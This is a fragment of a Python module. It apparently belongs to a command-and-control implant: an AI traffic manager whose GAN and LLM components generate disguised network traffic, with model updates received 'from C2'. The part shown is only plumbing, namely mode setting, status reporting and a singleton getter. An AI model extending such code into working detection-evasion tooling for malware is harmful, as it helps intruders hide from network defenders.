    def add_training_sample(self, sample: Dict[str, Any]) -> None:
        """Add a training sample for GAN.

        Args:
            sample: Traffic sample dictionary.
        """
        self._gan_generator.add_training_sample(sample)

    def update_gan_model(self, model_data: bytes) -> bool:
        """Update GAN model from C2.

        Args:
            model_data: New model binary data.

        Returns:
            True if update succeeded.
        """
        return self._gan_generator.update_model(model_data)

    def set_mode(self, mode: TrafficGenerationMode) -> None:
        """Set traffic generation mode.

        Args:
            mode: New generation mode.
        """
        self._mode = mode
        logger.info(f"Traffic generation mode set to: {mode.value}")

    def get_status(self) -> Dict[str, Any]:
        """Get AI traffic manager status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "mode": self._mode.value,
            "gan_available": self._gan_generator._model_available,
            "llm_available": self._llm_constructor._llm_available,
            "communication_records": len(self._anomaly_detector._communication_history),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_ai_traffic_manager: Optional[AITrafficManager] = None


def get_ai_traffic_manager(
    gan_model_path: Optional[str] = None,
    mode: TrafficGenerationMode = TrafficGenerationMode.HYBRID,
) -> AITrafficManager:
    """Get the global AITrafficManager singleton.

    Args:
        gan_model_path: Path to GAN model file.
        mode: Traffic generation mode.

    Returns:
        Singleton AITrafficManager instance.
    """
    global _ai_traffic_manager
    if _ai_traffic_manager is None:
        _ai_traffic_manager = AITrafficManager(gan_model_path, mode)
    return _ai_traffic_manager


__all__ = [
    "AITrafficManager",
    "GANTrafficGenerator",
    "LLMRequestConstructor",
    "AnomalyDetector",
    "StaticTemplateDatabase",
    "TrafficPattern",
    "AnomalyDetection",
    "SelfCheckReport",
    "TrafficGenerationMode",
    "AnomalyType",
    "get_ai_traffic_manager",
]
